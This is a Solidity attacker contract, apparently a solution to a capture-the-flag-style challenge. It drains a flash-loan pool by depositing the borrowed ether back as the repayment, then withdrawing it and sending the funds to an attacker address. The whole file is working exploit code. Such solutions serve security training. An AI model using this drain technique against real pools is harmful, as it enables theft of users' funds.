// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "./SideEntranceLenderPool.sol";

/**
 * @title SideEntranceLenderPoolAttacker
 * @author pistomat
 */
contract SideEntranceLenderPoolAttacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool public sideEntranceLenderPool;
    address attacker;

    constructor(address _sideEntranceLenderPoolAddress, address _attackerAddress) {
        sideEntranceLenderPool = SideEntranceLenderPool(_sideEntranceLenderPoolAddress);
        attacker = _attackerAddress;
    }

    function attack() external {
        sideEntranceLenderPool.flashLoan(1000 ether);
        sideEntranceLenderPool.withdraw();
        payable(attacker).call{value: address(this).balance}("");
    }

    function execute() external payable override {
        sideEntranceLenderPool.deposit{value: 1000 ether}();
    }

    receive() external payable {}
}
